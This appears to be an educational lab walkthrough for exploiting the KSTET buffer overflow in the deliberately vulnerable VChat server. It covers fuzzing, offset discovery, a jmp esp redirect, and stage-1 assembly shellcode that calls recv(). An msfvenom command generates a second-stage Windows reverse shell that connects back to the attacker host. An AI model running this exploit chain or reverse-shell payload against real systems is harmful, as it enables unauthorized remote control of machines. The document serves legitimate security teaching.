# VChat KSTET Exploitation: Multistage Exploitations

*Notice*: The following exploit, and its procedures are based on the original [Blog](https://fluidattacks.com/blog/vulnserver-kstet/)
___
<!-- MITRE link's topic may be slightly differnt -->
This exploit will explore the use of [Multi-Stage Exploits](https://attack.mitre.org/techniques/T1104/) where in this case the first stage will provide install access and a jumping off point to the later stages. That is our first stage will be injected using the initial vulnerability in the software; in this case the VChat server. Once this initial stage has been deployed we can use it, either as an access point to deploy additional shellcode as we do here, or in a more complex scenarios to download and deploy more complex malware onto a target system through this new channel.

<!-- Reword and Verify -->
This is particularly useful in environment with constraints and limited resources related to the application or service that is being exploited. This also in some cases allows attacker to gain further access into a system from say a phishing attack which deploys malicious applications, or injects shellcode into a process to deploy a second stage allowing for greater access to the system.

## Exploitation
### PreExploitation
1. **Windows**: Setup Vchat
   1. Compile VChat and it's dependencies if they has not already been compiled. This is done with mingw 
      1. Create the essfunc object File 
		```powershell
		$ gcc.exe -c essfunc.c
		```
      2. Create the [DLL](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library) containing functions that will be used by the VChat.   
		```powershell
		# Create a the DLL with an 
		$ gcc.exe -shared -o essfunc.dll -Wl,--out-implib=libessfunc.a -Wl,--image-base=0x62500000 essfunc.o
		```
         * ```-shared -o essfunc.dll```: We create a DLL "essefunc.dll", these are equivalent to the [shared library](https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html) in Linux. 
         * ```-Wl,--out-implib=libessfunc.a```: We tell the linker to generate generate a import library "libessfunc".a" [2].
         * ```-Wl,--image-base=0x62500000```: We specify the [Base Address](https://learn.microsoft.com/en-us/cpp/build/reference/base-base-address?view=msvc-170) as ```0x62500000``` [3].
         * ```essfunc.o```: We build the DLL based off of the object file "essfunc.o"
      3. Compile the VChat application 
		```powershell
		$ gcc.exe vchat.c -o vchat.exe -lws2_32 ./libessfunc.a
		```
         * ```vchat.c```: The source file is "vchat.c"
         * ```-o vchat.exe```: The output file will be the executable "vchat.exe"
         * ```-lws2_32 ./libessfunc.a```: Link the executable against the import library "libessfunc.a", enabling it to use the DLL "essefunc.dll"
   2. Launch the VChat application 
		* Click on the Icon in File Explorer when it is in the same directory as the essefunc dll
2. **Linux**: Run NMap
	```sh
	# Replace the <IP> with the IP of the machine.
	$ nmap -A <IP>
	```
   * We can think of the "-A" flag like the term aggressive as it does more than the normal scans, and is often easily detected.
   * This scan will also attempt to determine the version of the applications, this means when it encounters a non-standard application such as *VChat* it can take 30 seconds to 1.5 minuets depending on the speed of the systems involved to finish scanning. You may find the scan ```nmap <IP>``` without any flags to be quicker!
   * Example results are shown below:

		![NMap](Images/Nmap.png)

3. **Linux**: As we can see the port ```9999``` is open, we can try accessing it using **Telnet** to send unencrypted communications
	```
	$ telnet <VChat-IP> <Port>

	# Example
	# telnet 127.0.0.1 9999
	```
   * Once you have connected, try running the ```HELP``` command, this will give us some information regarding the available commands the server processes and the arguments they take. This provides us a starting point for our [*fuzzing*](https://owasp.org/www-community/Fuzzing) work.
   * Exit with ```CTL+]```
   * An example is shown below

		![Telnet](Images/Telnet.png)

4. **Linux**: We can try a few inputs to the *KSTET* command, and see if we can get any information. Simply type *KSTET* followed by some additional input as shown below

	![Telnet](Images/Telnet2.png)

	* Now, trying every possible combinations of strings would get quite tiresome, so we can use the technique of *fuzzing* to automate this process as discussed later in the exploitation section.
	* In this case we will do some fuzzing to keep the exploit sections relatively consistent, but as you can see we know crashing this command will not take much!
### Dynamic Analysis 
This phase of exploitation is where we launch the target application or binary and examine its behavior based on the input we provide. We can do this both using automated fuzzing tools and manually generated inputs.

#### Launch VChat
1. Open Immunity Debugger

	<img src="Images/I1.png" width=800> 

    * Note that you may need to launch it as the *Administrator* this is done by right clicking the icon found in the windows search bar or on the desktop as shown below:
			
	<img src="Images/I1b.png" width = 200>

2. Attach VChat: There are Two options! 
   1. When the VChat is already Running 
        1. Click File -> Attach

			<img src="Images/I2a.png" width=200>

		2. Select VChat 

			<img src="Images/I2b.png" width=500>

   2. When VChat is not already Running -- This is the most reliable option!
        1. Click File -> Open, Navigate to VChat

			<img src="Images/I3-1.png" width=800>

        2. Click "Debug -> Run"

			<img src="Images/I3-2.png" width=800>

        3. Notice that a Terminal was opened when you clicked "Open" Now you should see the program output

			<img src="Images/I3-3.png" width=800>
3. Ensure that the execution in not paused, click the red arrow (Top Left)
	
	<img src="Images/I3-4.png" width=800>

#### Fuzzing
SPIKE is a C based fuzzing tool that is commonly used by professionals, it is available in the [kali linux](https://www.kali.org/tools/spike/) and other [pen-testing platforms](https://www.blackarch.org/fuzzer.html) repositories. We should note that the original reference page appears to have been taken over by a slot machine site at the time of this writing, so you should refer to the [original writeup](http://thegreycorner.com/2010/12/25/introduction-to-fuzzing-using-spike-to.html) of the SPIKE tool by vulnserver's author [Stephen Bradshaw](http://thegreycorner.com/) in addition to [other resources](https://samsclass.info/127/proj/p18-spike.htm) for guidance. The source code is still available on [GitHub](https://github.com/guilhermeferreira/spikepp/) and still maintained on [GitLab](https://gitlab.com/kalilinux/packages/spike).

1. Open a terminal on the **Kali Linux Machine**
2. Create a file ```KSTET.spk``` file with your favorite text editor. We will be using a SPIKE script and interpreter rather than writing out own C based fuzzer. We will be using the [mousepad](https://github.com/codebrainz/mousepad) text editor.
	```sh
	$ mousepad KSTET.spk
	```
	* If you do not have a GUI environment, a editor like [nano](https://www.nano-editor.org/), [vim](https://www.vim.org/) or [emacs](https://www.gnu.org/software/emacs/) could be used 
3. Define the FUZZER parameters, we are using [SPIKE](https://www.kali.org/tools/spike/) with the ```generic_send_tcp``` interpreter for TCP based fuzzing.  
		
	```
	s_readline();
	s_string("KSTET ");
	s_string_variable("*");
	```
    * ```s_readline();```: Return the line from the server
    * ```s_string("KSTET ");```: Specifies that we start each message with the *String* KSTET
    * ```s_string_variable("*");```: Specifies a String that we will mutate over, we can set it to * to say "any" as we do in our case 
4. Use the Spike Fuzzer 	
	```
	$ generic_send_tcp <VChat-IP> <Port> <SPIKE-Script> <SKIPVAR> <SKIPSTR>

	# Example 
	# generic_send_tcp 10.0.2.13 9999 KSTET.spk 0 0	
	```
    * ```<VChat-IP>```: Replace this with the IP of the target machine 
	* ```<Port>```: Replace this with the target port
	* ```<SPIKE-Script>```: Script to run through the interpreter
	* ```<SKIPVAR>```: Skip to the n'th **s_string_variable**, 0 -> (S - 1) where S is the number of variable blocks
	* ```<SKIPSTR>```: Skip to the n'th element in the array that is **s_string_variable**, they internally are an array of strings used to fuzz the target.
5. Observe the results on VChat's terminal output

	<img src="Images/I4.png" width=600>

	* Notice that the VChat appears to have crashed after our second message! We can see based on the stack's status that we do not need to send a message of length *5000* as was done when the server crashed (in my case). We can see that there is around 100 bytes of space before the series of `A`s stop.
6. We can now try a few manual tests using the [`telnet`](https://linux.die.net/man/1/telnet) client as shown below. We range from a small set of four A's to near a hundred.

	<img src="Images/I4b.png" width=600>

	* Here we crash the server once we have entered ninety six `A`s 

	<img src="Images/I4c.png" width=600>

	* We can further see that VChat crashes once it receives sixty `A`s
7. We can see at the bottom of *Immunity Debugger* that VChat crashed due to a memory access violation. This means we likely overwrote the return address stored on the stack, leading to the EIP being loaded with an invalid address, this error could have also been caused if we overwrote a local pointer that is then dereferenced... However, we know from previous exploits on VChat this is unlikely.

	<img src="Images/I4d.png" width=600>

8. We can also look at the comparison of the Register values before and after the fuzzing in Immunity Debugger 
	* Before 

		<img src="Images/I7.png" width=600>

	* After

		<img src="Images/I8.png" width=600>

      * The best way to reproduce this is to use [exploit0.py](./SourceCode/exploit0.py).
9. We can examine the messages SPIKE is sending by examining the [tcpdump](https://www.tcpdump.org/) or [wireshark](https://www.wireshark.org/docs/wsug_html/) output.

	<img src="Images/I5.png" width=800> 

	* After capturing the packets, right click a TCP stream and click follow! This allows us to see all of the output.

		<img src="Images/I6.png" width=600> 

#### Further Analysis
1. Generate a Cyclic Pattern. We do this so we can tell *where exactly* the return address is located on the stack. We can use the *Metasploit* program [pattern_create.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_create.rb). By analyzing the values stored in the register, we can tell where in memory the return address is stored. 
	```
	/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
	```
	* This will allow us to inject a new return address at that location.
2. Run the [exploit1.py](./SourceCode/exploit1.py) to inject the cyclic pattern into the VChat program's stack and observe the EIP register. 

	<img src="Images/I9.png" width=600> 

3. Notice that the EIP register reads `41326341` in this case, we can use the [pattern_offset.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb) script to determine the address offset based on out search strings position in the pattern. 
	```
	$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41326341
	```
	* This will return an offset as shown below, in this case the value is `66`

	<img src="Images/I10.png" width=600> 

4. The next thing that is done, is to modify the exploit program to reflect the file [exploit2.py](./SourceCode/exploit2.py).
   * We do this to validate that we have the correct offset for the return address!

		<img src="Images/I11.png" width=600>

		* See that the EIP is a series of the value `42` that is a series of Bs. This tells us that we can write an address to that location in order to change the control flow of the program.
		* Note: It took a few runs for this to work and update on the Immunity debugger.
5. Use the [mona.py](https://github.com/corelan/mona) python program within the Immunity Debugger to determine some useful information. We run the command ```!mona findmsp``` in the command line at the bottom of Immunity Debugger. **Note:** We must have sent the cyclic pattern in the stack frame at this time!

	<img src="Images/I12.png" width=600>

      * We can see that the offset (Discovered with [pattern_offset.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb) earlier) is at the byte offset of 66, with the ESP at the offset of 70 and has 24 bytes following it, and the EBP is at the byte offset 62.
      * The most important thing we learn is that we have 984 bytes to work with!  
6. Open the `Executable Modules` window from the **views** tab. This allows us to see the memory offsets of each dependency VChat uses. This will help inform us as to which `jmp esp` instruction to pick, since we want to avoid any *windows dynamic libraries* since their base addresses may vary between executions and systems. 

	<img src="Images/I13.png" width=600>

7. Use the command `!mona jmp -r esp -cp nonull -o` in the Immunity Debugger command line to find some `jmp esp` instructions.

	<img src="Images/I14.png" width=600>

      * The `-r esp` flag tells *mona.py* to search for the `jmp esp` instruction
      * The `-cp nonull` flag tells *mona.py* to ignore null values
      * The `-o` flag tells *mona.py* to ignore OS modules
      * We can select any output from this, 

	<img src="Images/I15.png" width=600>

      * We can see there are nine possible `jmp esp` instructions in the essefunc dll that we can use, any should work. We will use the last one `0x625014E6`
8. Use a program like [exploit3.py](./SourceCode/exploit3.py) to verify that this works.

	![GIF Example](Videos/Exploit3.gif)


   1. Click on the black button highlighted below, enter in the address we decided in the previous step

		<img src="Images/I16.png" width=600>

   2. Set a breakpoint at the desired address (Right click)

		<img src="Images/I17.png" width=600>

   3. Run the [exploit3.py](./SourceCode/exploit3.py) program till a overflow occurs (See EIP/ESP and stack changes), you should be able to tell by the black text at the bottom the the screen that says `Breakpoint at ...`.

		<img src="Images/I18.png" width=600>

         * Notice that the EIP now points to an essefunc.dll address!
	4. Once the overflow occurs click the *step into* button highlighted below 

		<img src="Images/I19.png" width=600>

	5. Notice that we jump to the stack we just overflowed!

		<img src="Images/I20.png" width=600> 


Now that we have all the necessary parts for the creation of a exploit we will discuss what we have done so far (the **exploit.py** files), and how we can now expand our efforts to gain a shell in the target machine.
### Exploitation

#### Stack Space 
1. We know from one of our previous runs of `mona.py` (`!mona findmsp`) that we have a very limited amount of space following the overwritten return address we use in the *EIP* register. As we have done in previous exploits we will preform a short relative jump to the start of the buffer so we can use the sixty six bytes that precede our return address.

   1. Set a breakpoint at the `JMP ESP` instruction as we did in the previous section

		<img src="Images/I17.png" width=600>

   2. Run the [exploit3.py](./SourceCode/exploit3.py) program till a overflow occurs (See EIP/ESP and stack changes), you should be able to tell by the black text at the bottom the the screen that says `Breakpoint at ...`.

		<img src="Images/I18.png" width=600>

	3. Now scroll to the top of the buffer, we know where the top of the buffer is since it is where the first `A` or Hex value `41` will be located. 

		<img src="Images/I21.png" width=600>

	4. Now right click the address we jumped to, and select Assemble creating the `JMP <Address>` command, where `<Address>` is replaced with the starting address of our buffer. 

		* Select Assemble 

			<img src="Images/I22.png" width=600>

		* Assemble the instruction.

			<img src="Images/I23.png" width=600> 

	5. Once you click *step* we should arrive at the start of the buffer, now right click the newly assembled instruction and select *Binary Copy*

		<img src="Images/I24.png" width=600> 

2. Now that we have the Assembly instruction for the Short Jump, place it into the python program as shown in [exploit4.py](./SourceCode/exploit4.py).
	```python
	PAYLOAD = (
		b'KSTET ' +
		b'A' * 66 +
		# 625014E6    FFE4                        JMP ESP
		struct.pack('<L', 0x625014E6) +
		# JMP SHORT 0xb8
		b'\xeb\xb8' +
		b'C' * (26 - 2)
	)
	```
3. Restart the VChat server, and set a breakpoint at the `JMP ESP` instruction, run the [exploit4.py](./SourceCode/exploit4.py) program and ensure that it works!

	![GIF Example](Videos/Exploit4.gif)

#### Shell Code Generation
Due to the limited space on the stack we have to work with (66 bytes) we will be using the techniques discussed in the [Code Reuse](https://github.com/DaintyJet/VChat_GTER_CodeReuse). Where we will reuse the code from libraries that have already be loaded by our target *VChat*. As this is a TCP server, it should have the necessary programs loaded for us.  

1. The function that we need to use for this is the `recv(...)` function call. This has the following signature. 
	```
	int recv(
		[in]  SOCKET s,
		[out] char   *buf,
		[in]  int    len,
		[in]  int    flags
	);
	```
	* `s`: This is a Socket Descriptor, which is a kind of [File Descriptor](https://learn.microsoft.com/en-us/windows/win32/fileio/file-handles) (Or Handle). This is really just an integer value
	* `buf`: A pointer to the char array to place incoming data
	* `len`: The length of the buffer 
	* `flags`: Flags used to control the behavior of the function
2. Now to go about finding some of the information needed for our exploit we can do the following.

	![GIF Example](Videos/FindRECVCall.gif)

	1. Right click the CPU Window, and select *Search For* and then *All Intermodular Calls*.

		<img src="Images/I25.png" width=600>

	2. We can use this to look for the calls relating to the `recv(...)` function.

		<img src="Images/I26.png" width=600>

3. Once we have the call Instruction Located, we can jump to it, and set a breakpoint. This way we can extract the Address of the `recv(...)` call. Alternatively we could use the [Arwin](https://github.com/xinwenfu/arwin) program to do this.

	![GIF Example](Videos/FindRECV.gif)

	1. Goto the Call Address  

		<img src="Images/I27.png" width=600>

	2. Set a breakpoint

		<img src="Images/I28.png" width=600>

	3. Make a Telnet Connection 

		<img src="Images/I29.png" width=600>

	4. Extract the Address information from the stack 

		<img src="Images/I30.png" width=600>

		* The File Descriptor used for the socket can also be extracted, however this is essentially a random number from call to call, so we cannot rely on this from exploit to exploit. So the Socket Handle information is not that useful in this case.
4. Use the following shell code from the [blog]() provided by fluid attacks
	```
	sub esp,0x64            ; Move ESP pointer above our initial buffer to avoid
							; overwriting our shellcode
	xor edi,edi             ; Zero out EDI (Anything XORed with itself is 0)
	socket_loop:            ; Brute Force Loop Label
	xor ebx,ebx             ; Zero out EBX (Anything XORed with itself is 0)
	push ebx                ; Push 'flags' parameter = 0 
	add bh,0x4              ; Make EBX = 0x00000400 which is  1024 bytes
	push ebx                ; Push `len` parameter, this is 1024 bytes
	mov ebx,esp             ; Move the current pointer of ESP into EBX
	add ebx,0x64            ; Point EBX the original ESP to make it the pointer to
							; where our stage-2 payload will be received
	push ebx                ; Push `*buf` parameter = Pointer to ESP+0x64
	inc edi                 ; Make EDI = EDI + 1
	push edi                ; Push socket handle `s` parameter = EDI, For each loop we increment EDI
	mov eax,0x40252C90      ; We need to make EAX = 0040252C but we can't inject
							; null bytes. So 40252C90 is shift-left padded with 90 (NOP)
	shr eax,0x8             ; Remove the '90' byte of EAX by shifting right and
							; This makes EAX = 0040252C
	call eax                ; Call recv()
	test eax,eax            ; Check if our recv() call was successfully made
	jnz socket_loop         ; If recv() failed, jump back to the socket loop where
							; EDI will be increased to check the next socket handle
	```
5. Use [`nasm`](https://nasm.us/) on the *Kali Linux* machine to compile the assembly into the appropriate shellcode.
	1) Ensure nasm is installed, if not you will need to [install it](https://nasm.us/) and add it to the path.

		<img src="Images/I31.png" width=800>

	2) Run nasm on the target assembly, Run: `nasm -f elf32 -o shellcode.o shellcode.asm`
		* `nasm`: Netwide Assembler, assembles assembly into x86 machine code.
		* `-f elf32`: elf32 format
		* `-o shellcode.o`: Shellcode File
		* `shellcode.asm`: input file
6) Now we can extract the binary with a simple [shell script](./SourceCode/extract.sh).
	```sh
	for i in $(objdump -d shellcode.o -M intel | grep "^ " | cut -f2); do 
		echo -n '\x'$i; 
	done; 
	echo
	```
	* `for i in`: For each value `$i` generated by the following command 
	* `objdump -d shellcode.o -M intel | grep "^ " | cut -f2`: Extracts the hex shellcode
		* `objdump -d shellcode.o -M intel`: Dump the assembly of the object file compiled for Intel format
		* `grep "^ "`: Extract only those lines containing assembly
		* `cut -f2`: Extract the second field, this contains the hex representation of the instructions
	* ` do echo -n '\x'$i; done`: Echo the hex extracted in the format `\x<HexValue>`
	* `echo`: Print an extra line
	* **Note**: If you create this file be sure to make it executable `chmod +x extract.sh`, then you can run it using the command `./extract.sh`

	<img src="Images/I32.png" width=800>
#### Staging
1. Now we can add our first stage shell code to the [exploit5.py](./SourceCode/exploit5.py), we can then set a breakpoint at the `jmp esp` instruction we chose earlier and ensure that it works properly!

	![GIF Example](Videos/Exploit5.gif)

	1. Set a breakpoint at the `jmp esp` instruction 

		<img src="Images/I33.png" width=800>

	2. Launch the [exploit5.py](./SourceCode/exploit5.py) attack. Once you have stepped through the `jmp esp` and the short `jmp` you should see the following in your disassembler.

		<img src="Images/I34.png" width=800>

	3. Set a breakpoint on the `TEST EAX,EAX` instruction, and click run. Once you hit this click run again. Once you are satisfied this program is working correctly, as the EDI register should be incrementing; we can stop since there is no guarantee our Socket Handle will be a reasonably low number 

		<img src="Images/I35.png" width=800>

2. Generate the second stage reverse shell code using ```msfvenom``` program, and create a exploit as shown in [exploit6.py](./SourceCode/exploit6.py) 

	```
	$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=8080 EXITFUNC=thread -f python -v SHELL -b '\x00x\0a\x0d'
	```
	* `-p `: Payload we are generating shellcode for.
    	* `windows/shell_reverse_tcp`: Reverse TCP payload for windows
    	* `LHOST=10.0.2.7`: The remote listening host's IP, in this case our Kali machine's IP 10.0.2.7
    	* `LPORT=8080`: The port on the remote listening host's traffic should be directed to in this case port 8080
    	* `EXITFUNC=thread`: Create a thread to run the payload
  	* `-f`: The output format 
    	* `python`: Format for use in python scripts.
  	* `-v`: Specify a custom variable name
    	* `SHELL`: Shell Variable name
  	* `-b`: Specifies bad chars and byte values. This is given in the byte values 
      	* `\x00x\0a\x0d`: Null char, carriage return, and newline. 
3. [exploit6.py](./SourceCode/exploit6.py) first sends the Stage-1 exploit as done in [exploit5.py](./SourceCode/exploit5.py), then waits a few seconds and send the second stage of the exploit which will attempt to reach out to our *Kali Linux* machine on port 8080. To add some resiliency to inaccurate jumps we pad the buffer the `recv(...)` call writes to which is 1024 bytes with `\x90` the NOP instruction by adding them to the start of the second stage.

When the exploit does work, you will need to exit out of the `cmd` window manually, otherwise you will experience socket bind errors as shown below.

## VChat and Exploit Code

### VChat Code
As with the previous exploits the VChat code is relatively simple in nature. Once a connection is received on port 9999, a thread is created running the  `DWORD WINAPI ConnectionHandler(LPVOID cli)` function, where `LPVOID cli` is a void pointer that holds the address of a `client_t` structure; this is a custom structure that contains the necessary connection information.  


Below is the code segment that handles the `KSTET` message type. 
```c
else if (strncmp(RecvBuf, "KSTET ", 6) == 0) {
	char* KstetBuf = malloc(100);
	strncpy(KstetBuf, RecvBuf, 100);
	memset(RecvBuf, 0, DEFAULT_BUFLEN);
	Function2(KstetBuf);
	SendResult = send(Client, "KSTET SUCCESSFUL\n", 17, 0);
}
```
The buffer we copy to is only 100 bytes, and by using the [`strncpy(char * destination, const char * source, size_t num )`](https://cplusplus.com/reference/cstring/strncpy/) function, we guarantee we will only copy 100 bytes from the source into the destination buffer. This prevents buffer overflows as we limit the number of character copied not by the size of the source, but based on something we specify. Then to prevent malicious code from existing in memory, as the original Vulnserver did not free the receiving buffer the line `memset(RecvBuf, 0, DEFAULT_BUFLEN);` zeros out the receiving buffer. Then the code calls `Function2(...)`; this is where the overflow occurs. 

```c
void Function2(char* Input) {
	char Buffer2S[60];
	strcpy(Buffer2S, Input);
}
```

Within `Function2(char* input)` we copy the buffer that possibly contains 100 bytes, into a locally declared buffer that has 60 bytes of space allocated. As we use the [`strcpy(char * destination, const char * source)`](https://cplusplus.com/reference/cstring/strcpy/) function, this copies from the source (100 bytes) to the destination buffer (60 bytes) until a null terminator is detected in the source buffer.

### Shellcode
The resulting shellcode is shown below:
```s
sub esp,0x64            ; Move ESP pointer above our initial buffer to avoid
						; overwriting our shellcode
xor edi,edi             ; Zero out EDI (Anything XORed with itself is 0)
socket_loop:            ; Brute Force Loop Label
xor ebx,ebx             ; Zero out EBX (Anything XORed with itself is 0)
push ebx                ; Push 'flags' parameter = 0 
add bh,0x4              ; Make EBX = 0x00000400 which is  1024 bytes
push ebx                ; Push `len` parameter, this is 1024 bytes
mov ebx,esp             ; Move the current pointer of ESP into EBX
add ebx,0x64            ; Point EBX the original ESP to make it the pointer to
						; where our stage-2 payload will be received
push ebx                ; Push `*buf` parameter = Pointer to ESP+0x64
inc edi                 ; Make EDI = EDI + 1
push edi                ; Push socket handle `s` parameter = EDI, For each loop we increment EDI
mov eax,0x74F123A0      ; We need to make EAX = 0x74F123A0 but we can't inject if there are null bytes in this.
                        ; Since there are none we do not need to do any shifting
call eax                ; Call recv()
test eax,eax            ; Check if our recv() call was successfully made
jnz socket_loop         ; If recv() failed, jump back to the socket loop where
						; EDI will be increased to check the next socket handle
```

We first adjust the stack pointer that is stored in the `ESP` register: `sub esp,0x64`. This is done to prevent the function calls from overwriting our shell code.


The `EDI` register will be used to store our Socket Handle; this is simply an integer value. Since we are brute forcing this we need to start at zero. We achieve this with the following instruction: `xor edi,edi`. By XORing a value with itself we achieve the value of zero.


Following this we have a label `socket_loop:`. This is used to create the loop by giving us a way to *easily* jump backwards in the code. 


Next we configure the stack for a call to the `recv(...)` function; Remember that we place the arguments onto the stack in reverse order. First we zero out a register with the following instruction: `xor ebx,ebx`. This is done so we can place a zero onto the stack for the *Flag* argument with the instruction: `push ebx`. Then we add 0x4 to the *bh* register: `add bh,0x4`, this is done so the `EBX` register which was zero now contains the value 1024. This is because we place the value `0x4` into the *high* registers (bytes 8 - 15) of the `EBX` register. The value 1024 is placed onto the stack again with the push instruction: `push ebx`.  The instructions `mov ebx,esp` and `add ebx,0x64` setup the location we will write the received data to, in this case we  we load the stack pointer into the `EBX` register, and sets it to the original `ESP` location before the initial subtraction; This is so the received second stage will be written to a nearby location. This is added to the stack with the instruction `push ebx`. The final parameter is configured with the instructions `inc edi` and `push edi`; the `inc edi` is used for our brute forcing of the Socket Handle and `push edi` places it onto the stack. Finally we make the call to the `recv(...)` function using `mov eax,0x74F123A0` by moving the address of `recv(...)` and using `call eax` call the function. We then check if the function succeeded using `test eax,eax` and if the returned value is not zero `jnz socket_loop` we repeat the loop; otherwise we fall through into the stage-2 shellcode we wrote to the stack with our `recv(...)` call.

## Note

The shifting described in the blog is as follows:
```s
mov eax,0x40252C90      ; We need to make EAX = 0040252C but we can't inject
                        ; null bytes. So 40252C90 is shift-left padded with 90
shr eax,0x8             ; Remove the '90' byte of EAX by shifting right and
                        ; This makes EAX = 0040252C
```
* `mov eax,0x40252C90`: Put the address of the `recv(...)` function into *eax*, this contains `0x90` as the original `0x0040252C` has null bytes.
* `shr eax,0x8`: Shifts the eax register right 8 bits to add the leading null byte.
